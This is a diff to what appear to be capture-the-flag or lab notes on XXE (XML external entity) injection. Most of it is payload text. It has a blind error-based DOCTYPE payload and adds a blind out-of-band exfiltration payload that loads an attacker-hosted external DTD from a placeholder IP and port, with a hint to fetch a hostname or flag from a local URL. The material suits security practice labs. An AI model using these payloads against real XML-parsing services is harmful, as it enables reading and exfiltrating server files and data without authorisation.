@@ -11,3 +11,9 @@ Blind Error:
 Need to host BlindErrorExternal.dtd
 <!DOCTYPE test [ <!ENTITY % xxe SYSTEM "IP, port and link to BlindErrorExternal.dtd"> %xxe; ] >
 If you are hosting on the same machine just use <Machine IP>:<PORT>/BlindErrorExternal.dtd
+
+Blind Out-of-band Data Exfiltration:
+Need to host BlindOOBExternal.dtd
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "IP, port and link to BlindOOBExternal.dtd"> %xxe;]>
+If you are hosting on the same machine just use <Machine IP>:<PORT>/BlindOOBExternal.dtd
+Retrieve the hostname or flag at "http://127.0.0.1:7000/hostname.php"
